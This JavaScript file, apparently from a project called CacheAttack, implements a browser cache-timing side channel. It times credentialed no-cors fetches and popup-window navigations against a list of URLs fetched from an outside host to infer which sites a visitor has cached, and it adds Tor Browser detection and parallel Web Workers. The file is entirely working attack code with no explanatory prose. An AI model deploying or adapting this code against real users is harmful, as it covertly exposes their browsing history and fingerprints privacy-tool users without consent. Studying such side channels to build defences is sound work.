/*jshint esversion: 8 */

// NDev 2020 https://github.com/NDevTK/CacheAttack
const firefox = navigator.userAgent.includes("Firefox");
const redirect = "https://cache.ndev.tk/window.html";
const max = 10.5;

function isTorBrowser() {
    var img = document.createElement("img");	
    // Creates a black 1x1 px image	
    img.src = 'data:image/png;base64,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';	

    var canvas = document.createElement("canvas");	
    canvas.width = 1;	
    canvas.height = 1;	
    var ctx = canvas.getContext("2d");	
    var imagedata = ctx.getImageData(0, 0, canvas.width, canvas.height);	

    return imagedata.data[0] == 255 	
                && imagedata.data[1] == 255	
                && imagedata.data[2] == 255	
                && imagedata.data[3] == 255;	
}

if (self.document === undefined) {
    onmessage = async e => {
        await ifCachedWorker(e.data, result => postMessage(result));
        postMessage("done");
    };
}

async function getWebsites(cb = false, websites = null, worker = true, CacheTest = false) {
    if (CacheTest) {
        let TestResult = await ifCached_test();
        if (!TestResult) {
            console.error("CacheAttack failed");
            return [];
        }
    }
    var output = [];
    cb = (cb) ? cb : item => output.push(item);
    if (websites === null) {
        websites = await getRules();
    }
    if(worker) {
        let checks = chunk(websites, Math.ceil(websites.length / navigator.hardwareConcurrency));
        await PromiseForeach(checks, async chunk => {
            let worker = new Worker("https://cache.ndev.tk/embed.js");
            worker.postMessage(chunk);
            await new Promise(resolve => {
                worker.onmessage = e => {
                    if (e.data === "done") {
                        resolve();
                        return
                    }
                    cb(e.data);
                };
            });
            worker.terminate();
        }, 600);
    } else {
        await ifCachedWorker(websites, cb);
    }
    return [...new Set(output)];
}

async function PromiseForeach(item, callback, delay = 0) {
    var jobs = [];
    for (let x of item) {
        await new Promise(resolve => setTimeout(resolve, delay));
        jobs.push(callback(x));
    }
    await Promise.all(jobs);
}

function chunk(array, size) {
    const chunked_arr = [];
    for (let i = 0; i < array.length; i++) {
        const last = chunked_arr[chunked_arr.length - 1];
        if (!last || last.length === size) {
            chunked_arr.push([array[i]]);
        } else {
            last.push(array[i]);
        }
    }
    return chunked_arr;
}

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    var body = await req.json();
    return body;
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if (res === undefined) return null;
    if (is304(res)) return true;
    return (res.transferSize !== 0);
}

async function ifCachedWorker(websites, cb) {
    // Foreach website check if cached
    for (let website of websites) {
        let result = await ifCached(website[0]);
        if (result) {
            cb(website);
        }
    }
}

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    await fetch("https://ndev.tk/README.md");
    let result2 = await ifCached("https://ndev.tk/README.md");
    return (!result && result2);
}

// Will include credentials so please use a sandbox domain or my postMessage API
async function ifCached(url) {
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors",credentials: "include",signal});
    } catch (err) {
        // Website blocked by client
        clearTimeout(timeout);
    }
    clearTimeout(timeout);
    return state;
}

function WindowEvent(check = false) {
    return new Promise(resolve => {
        window.addEventListener('message', e => {
            if (check !== false && e.data !== check) return;
            resolve(e.data);
        });
    });
}

function initChecker() {
    checker = open(redirect);
    window_timeout = (firefox) ? 10 : 30;
    if(isTorBrowser()) window_timeout = 150;
}

async function ifCached_window(url) {
    checker.location = url;
    let timeout = false;
    setTimeout(_ => {
       timeout = true;
       checker.location = redirect;
    }, window_timeout);
    event = await WindowEvent();
    let state = (!timeout);
    await WindowEvent("load");
    if (firefox) await new Promise(resolve => setTimeout(resolve, 50));
    return state;
}

async function block(url) {
    for (;;) {
        if (checker.closed) location.reload();
        checker.postMessage(url[0]);
        checker.location = redirect;
        await WindowEvent();
    }
}

function blockerFrame(url) {
    if (document.getElementById("ifrm")) {
        ifrm.src = redirect;
        return;
    }
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.id = "ifrm";
    ifrm.hidden = true;
    document.body.appendChild(ifrm);
}
